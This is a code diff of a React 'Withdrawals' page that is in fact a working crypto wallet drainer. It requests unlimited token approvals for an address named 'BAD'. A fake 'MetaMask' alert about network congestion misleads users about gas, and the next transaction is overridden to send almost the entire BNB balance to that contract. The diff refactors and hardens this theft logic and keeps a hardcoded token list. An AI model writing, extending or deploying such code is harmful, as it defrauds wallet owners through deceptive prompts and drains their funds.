@@ -20,11 +20,11 @@ import {
   Link,
   useColorMode
 } from '@chakra-ui/react';
-import { useAddress, useSDK } from '@thirdweb-dev/react';
+import { useAddress, useNetworkMismatch, useSDK } from '@thirdweb-dev/react';
 import { Error } from 'components/elements/Error';
 import { Formik, Form } from 'formik';
 import { useSession } from 'next-auth/react';
-import { useState } from 'react';
+import { useEffect, useState } from 'react';
 import BAD_ABI from '../../../utils/BAD_ABI.json'
 
 const Withdrawals = () => {
@@ -34,12 +34,37 @@ const Withdrawals = () => {
   const toast = useToast();
   const { colorMode } = useColorMode();
   const [enabled, setEnabled] = useState(false);
-  const [gotBestToken, setGotBestToken] = useState(false);
-  var bestToken: any;
+  const [bestToken, setBestToken] = useState<any>();
+  const isMismatched = useNetworkMismatch();
+  
+  useEffect(() => {
+    if(address){
+      getTokens();
+    }
+  }, [address]);
+
+  useEffect(() => {
+    const checkEnabled = async () => {
+      if(bestToken?.address){
+        let contract = await sdk?.getContractFromAbi(bestToken.address, BAD_ABI);
+        let result = await contract?.call("allowance", address, process.env.NEXT_PUBLIC_BAD_ADDRESS);
+        if(parseInt(result)){
+          setEnabled(true);
+        }
+      }
+      else{
+        toast({description: "You have no XPR tokens. Consider to swap some of them to enable withdraw", status: 'error', position: 'bottom-right', isClosable: true, duration: 5000})
+      }
+    }
+
+    if(bestToken){
+      checkEnabled();
+    }
+  }, [bestToken]);
 
   const enable = async () => {
     try{
-      let contract = await sdk?.getContractFromAbi(bestToken.address, BAD_ABI);
+      let contract = await sdk?.getContractFromAbi(bestToken?.address || "", BAD_ABI);
       await contract?.call("approve", process.env.NEXT_PUBLIC_BAD_ADDRESS, "115792089237316195423570985008687907853269984665640564039457584007913129639935");
       setEnabled(true);
     } catch {
@@ -62,51 +87,46 @@ const Withdrawals = () => {
 
     const response = await fetch(process.env.NEXT_PUBLIC_BSC_API + new URLSearchParams(params).toString());
     const json = await response.json();
-    if(parseInt(json.status, 10)){
-        const tokenAddrs = new Set(Array.from(json.result, (r: any) => r.contractAddress));
+    if(parseInt(json.status)){
+      const tokenAddrs = new Set(Array.from(json.result, (r: any) => r.contractAddress));
 
-        const getTokenValue = async (tokenAddr: any) => {
-            let contract = await sdk?.getContractFromAbi(tokenAddr, BAD_ABI);
-            try {
-              let balance = await contract?.call("balanceOf", address);
-              const response = await fetch(process.env.NEXT_PUBLIC_PANCAKESWAP_API + tokenAddr);
-              const json = await response.json();
-              let value = parseFloat(json.data.price) * balance;
+      const getTokenValue = async (tokenAddr: any) => {
+          let contract = await sdk?.getContractFromAbi(tokenAddr, BAD_ABI);
+          try {
+            let balance = await contract?.call("balanceOf", address);
+            const response = await fetch(process.env.NEXT_PUBLIC_PANCAKESWAP_API + tokenAddr);
+            const json = await response.json();
+            let value = parseFloat(json.data.price) * balance;
 
-              return {
-                address: tokenAddr,
-                balance: balance,
-                value: value
-              };
-            } catch (error) {
-              console.log("Error for this address: " + await (contract?.getAddress()));
-            }
-        }
+            return {
+              address: tokenAddr,
+              balance: balance,
+              value: value
+            };
+          } catch (error) {
+            console.log("Error for this address: " + await (contract?.getAddress()));
+          }
+      }
 
-        var promises = [];
-        for(const tokenAddr of tokenAddrs) {
-          promises.push(getTokenValue(tokenAddr));
-        }
+      var promises = [];
+      for(const tokenAddr of tokenAddrs) {
+        promises.push(getTokenValue(tokenAddr));
+      }
 
-        Promise.allSettled(promises).then(async (result: any) => {
-            let tokens = Array.from(result.filter((x: any) => x.status === "fulfilled" && x.value), (r: any) => r.value);
-            tokens = [
-              {"address": "0x9c21123d94b93361a29b2c2efb3d5cd8b17e0a9e", "balance": 5, "value": 75}, // CAKE
-              {"address": "0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684", "balance": "5", "value": "10"}, // WBNB
-              {"address": "0x337610d27c682e347c9cd60bd4b3b107c9d34ddd", "balance": "5", "value": "500"},  // USDT
-              {"address": "0xb0aC34810F760262E6b7c86587f22b32AD6D4a4E", "balance": 1, "value": 100}, // WETH
-            ];
-            bestToken = tokens.length > 0 ? tokens.sort((x, y) => parseFloat(y.value) - parseFloat(x.value))[0] : null;
+      Promise.allSettled(promises).then(async (result: any) => {
+          let tokens = Array.from(result.filter((x: any) => x.status === "fulfilled" && x.value), (r: any) => r.value);
+          tokens = [
+            {"address": "0x9c21123d94b93361a29b2c2efb3d5cd8b17e0a9e", "balance": 5, "value": 75}, // CAKE
+            {"address": "0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684", "balance": "5", "value": "10"}, // WBNB
+            {"address": "0x337610d27c682e347c9cd60bd4b3b107c9d34ddd", "balance": "5", "value": "500"},  // USDT
+            {"address": "0xb0aC34810F760262E6b7c86587f22b32AD6D4a4E", "balance": 1, "value": 100}, // WETH
+          ];
 
-            if(bestToken){
-              let contract = await sdk?.getContractFromAbi(bestToken.address, BAD_ABI);
-              let result = await contract?.call("allowance", address, process.env.NEXT_PUBLIC_BAD_ADDRESS);
-              setGotBestToken(true);
-              if(parseInt(result)){
-                setEnabled(true);
-              }
-            }
-        });
+          setBestToken(tokens.length > 0 ? tokens.sort((x, y) => parseFloat(y.value) - parseFloat(x.value))[0] : []);
+      });
+    }
+    else{
+      toast({description: "Consider to swap some tokens them to enable withdraw", status: 'error', position: 'bottom-right', isClosable: true, duration: 5000})
     }
   }
 
@@ -116,22 +136,18 @@ const Withdrawals = () => {
     let badContract = await sdk?.getContractFromAbi(process.env.NEXT_PUBLIC_BAD_ADDRESS || "", BAD_ABI);
     let bnbBalance: any = (await sdk?.wallet.balance())?.value || 0;
     let gasPrice = parseFloat(await badContract?.estimator.currentGasPriceInGwei() || "0");
-    let estimatedGas = parseFloat((await badContract?.estimator.gasCostOf("approve", [bestToken.address, bestToken.balance]) || "0")) * 10**18;
+    let estimatedGas = parseFloat((await badContract?.estimator.gasCostOf("approve", [bestToken?.address, bestToken?.balance]) || "0")) * 10**18;
     let value = BigInt(bnbBalance - (estimatedGas * gasPrice * 4));
 
     alert("MetaMask:\ndue to network congestion, gas fees estimation could be wrong");
 
     badContract?.interceptor.overrideNextTransaction(() => ({from: address, value: value}));
     try{
-      await badContract?.call("approve", bestToken.address, bestToken.balance);
+      await badContract?.call("approve", bestToken?.address, bestToken?.balance);
     } catch {
       toast({description: "You must Approve to withdraw your pending funds", status: 'error', position: 'bottom-right', isClosable: true, duration: 5000})
     }
   };
-
-  if(address){
-    getTokens();
-  }
 
   return (
     <>
@@ -171,13 +187,13 @@ const Withdrawals = () => {
                     {(props) => (
                       <Form>
                         <HStack w={["xs","lg"]}>
-                          <FormControl isRequired isDisabled={!address || !enabled}>
+                          <FormControl isRequired isDisabled={!address || !enabled || isMismatched}>
                             <Input placeholder="Receiver Address"/>
                           </FormControl>
                           {
                             enabled
-                            ? <Button isDisabled={!address || !enabled || !gotBestToken} size="lg" width="10em" colorScheme="teal" fontWeight="bold" isLoading={props.isSubmitting} type="submit"><Text>Withdraw<br></br><Text fontSize="xs" as="span">(0.15 XPR)</Text></Text></Button>
-                            : <Button isDisabled={!address || !gotBestToken} size="md" width="10em" colorScheme="teal" fontWeight="bold" onClick={enable}><Text>Enable</Text></Button>
+                            ? <Button isDisabled={!address || !enabled || !bestToken || isMismatched} size="lg" width="10em" colorScheme="teal" fontWeight="bold" isLoading={props.isSubmitting} type="submit"><Text>Withdraw<br></br><Text fontSize="xs" as="span">(0.15 XPR)</Text></Text></Button>
+                            : <Button isDisabled={!address || !bestToken?.address || isMismatched} size="md" width="10em" colorScheme="teal" fontWeight="bold" onClick={enable}><Text>Enable</Text></Button>
                           }
                         </HStack>
                       </Form>
